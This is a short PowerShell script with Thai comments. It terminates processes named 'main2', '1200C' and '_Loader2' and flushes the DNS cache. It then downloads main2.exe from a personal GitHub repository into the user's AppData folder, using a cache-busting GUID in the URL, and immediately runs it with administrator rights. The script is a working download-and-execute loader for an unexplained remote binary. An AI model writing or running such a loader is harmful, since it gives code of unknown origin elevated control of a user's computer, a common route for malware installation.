# 1. สั่งปิดโปรแกรมเดิมก่อน (รวมถึง main2 ถ้าเปิดค้างอยู่)
Stop-Process -Name "main2" -ErrorAction SilentlyContinue
Stop-Process -Name "1200C" -ErrorAction SilentlyContinue
Stop-Process -Name "_Loader2" -ErrorAction SilentlyContinue

# 2. กำหนด Path สำหรับไฟล์ main2.exe
$exePath = "$env:APPDATA\main2.exe"

# 3. ล้าง DNS Cache เพื่อป้องกันปัญหาการต่อเน็ต
ipconfig /flushdns

# 4. ตั้งค่า URL (ตรวจสอบให้แน่ใจว่า Link ตรงกับไฟล์ main2.exe บน GitHub)
$url = "https://github.com/lubyralph6-maker/1200D.ps1/raw/main/main2.exe?v=$([guid]::NewGuid())"

# 5. ดาวน์โหลดไฟล์
try {
    Write-Host "Downloading and starting main2..." -ForegroundColor Cyan
    Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing
} catch {
    Write-Host "Error: Cannot download main2 from GitHub!" -ForegroundColor Red
    exit
}

# 6. รันโปรแกรม main2 ทันที
if (Test-Path $exePath) {
    Write-Host "Launching main2..." -ForegroundColor Green
    # รันในฐานะ Administrator
    Start-Process -FilePath $exePath -Verb RunAs
}
